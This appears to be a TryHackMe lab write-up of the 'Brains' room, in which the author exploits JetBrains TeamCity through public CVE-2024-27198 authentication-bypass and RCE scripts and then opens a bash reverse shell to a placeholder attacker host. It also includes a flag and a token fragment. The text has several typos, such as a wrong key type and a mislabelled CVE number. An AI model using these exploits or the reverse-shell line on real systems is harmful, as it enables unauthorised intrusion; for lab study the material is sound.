---
{"dg-publish":true,"permalink":"/try-hack-me-rooms/brains/","tags":["#tryhackme","brains","offensivesecurity","ethicalhacking","writeup","#authenticationbypass"],"created":"2026-03-31T19:25:54.559+02:00","updated":"2026-04-02T14:23:32.101+02:00","dg-note-properties":{"tags":["#tryhackme","brains","offensivesecurity","ethicalhacking","writeup","#authenticationbypass"]}}
---

![](/img/user/Attachments/1_IpVNsJXvAdv12YJ82oxO3A-2241369949.png)

## Description

#### This room demonstrates: 

- 2 unauthenticated bypasses leading to full control of the system
- Exposed stacktrace message leads to identifying critical vulnerabilities
- RCE & administrator access to web interface


It is paramout that any organisation can ensure that there are limitations on what is kind of information is displayed via error messages. These error messages can enable a threat actor to identify vulnerabilities, establish an attack path and harm the infrastructure of a business or worse.


## Recon

First a full scan of the system 
![](/img/user/Attachments/firstnmap.png)

Now a more targeted scanning of the services running on the system 
![](/img/user/Attachments/nmap2.png)

A simple login page is shown and it seems that this is a Java-based application using the Jetbrains framework. 
![](/img/user/Attachments/loginpage.png)

We have a reset-pw page. Without any knowledge of existing users this is of no use at the moment.
![](/img/user/Attachments/reset-pw-page.png)


## Enumeration

A lot of these endpoints are 302's so not really useful. Gobuster also reveals a bunch of redirections and 400-like error messages.. 

![697](/img/user/Attachments/dirsearch.png)

Source code for the login page reveals something interesting ![](/img/user/Attachments/revealingsourcecode.png)

A boring stacktrace message 
```
<!-- START EXTENSION CONTENT jetbrains.buildServer.resetPassword.ResetPasswordPageExtension: name:resetPasswordLink: /plugins/reset-password/resetPasswordLink.jsp --><!-- START EXTENSION CONTENT jetbrains.buildServer.resetPassword.ResetPasswordPageExtension: name:resetPasswordLink: /plugins/reset-password/resetPasswordLink.jsp -->



<!-- END EXTENSION CONTENT jetbrains.buildServer.resetPassword.ResetPasswordPageExtension -->

<!-- START EXTENSION CONTENT jetbrains.buildServer.web.forbiddenDomains.ForbiddenDomainHeaderWarning$Extension: name:jetbrains.buildServer.web.forbiddenDomains.ForbiddenDomainHeaderWarning: /forbiddenDomainWarning.jsp -->


<!-- END EXTENSION CONTENT jetbrains.buildServer.web.forbiddenDomains.ForbiddenDomainHeaderWarning$Extension -->

```

## Exploitation

So, googling the error in the stack trace shows not much. However googling the Teamcity version quickly led me to find 2 **authentication bypass cve's**

I quickly find github repo's listing available exploits which are ready to use python scripts.
![](/img/user/Attachments/teamcity-cve-search.png)

Link: https://github.com/yoryio/CVE-2024-27198

![](/img/user/Attachments/cve1.png)

Saving the script and running it creates a new user and  gives full access to the system. 

And once I run the script I am able to log into the panel

![](/img/user/Attachments/loginsuccess.png)

A more detailed explanation of the vulnerabilities can be found from [Rapid7](https://www.rapid7.com/blog/post/2024/03/04/etr-cve-2024-27198-and-cve-2024-27199-jetbrains-teamcity-multiple-authentication-bypass-vulnerabilities-fixed/)

![](/img/user/Attachments/rapid7-vuln-description.png)

For the sake I even ran the other CVE and it failed to establish an interactive shell however it retrieved a token for a different user **rcity_rules_313**

Token= `dZaqscElGu
![](/img/user/Attachments/cve2-results.png)

Lets see if it is possible to establish a shell connection via SSH. 

Let's generate a SSH key 

`ssh-keygen -t ed25319 -C "administrator@domain.com"

![](/img/user/Attachments/ssh-generated.png)

Lets upload the private key via the web interface

![](/img/user/Attachments/ssh-gen.png)

For some reason SSH is blocked. Perhaps this is not the intended **attack path** moving on..

Looking for a different PoC on github RCE is achieved running the exploit on the target.

I will refer to the CVE = **[CVE_2024_21798](https://github.com/W01fh4cker/CVE-2024-27198-RCE/blob/main/CVE-2024-27198-RCE.py)**

`pyython3 exploit.py -t http://TARGET:PORT`

![](/img/user/Attachments/rce-achieved.png)

Lets locate the users on the system
![](/img/user/Attachments/locate-users.png)

## Post-exploitation

Lets identify if **netcat** is on the system since this is an unstable shell and the connection might get dropped and otherwise is annoying to work with. 

Spawn a reverse shell 
`bash -i >& /dev/tcp/ATTACKER_IP/ATTACKER_PORT 0>&1`

![](/img/user/Attachments/identify-nc.png)


Now grabbing the reverse shell in netcat 

![](/img/user/Attachments/reverse-shell-established.png)
### First Flag

`THM{faa9bac345709b6620a6200b484c7594}`
![](/img/user/Attachments/pwned.png)

## Attack Pattern Analysis

Nmap > apache server vulnerable to auth bypass > PoC exploit from github > RCE & Admin access to web interface > 


## Forensic Analysis

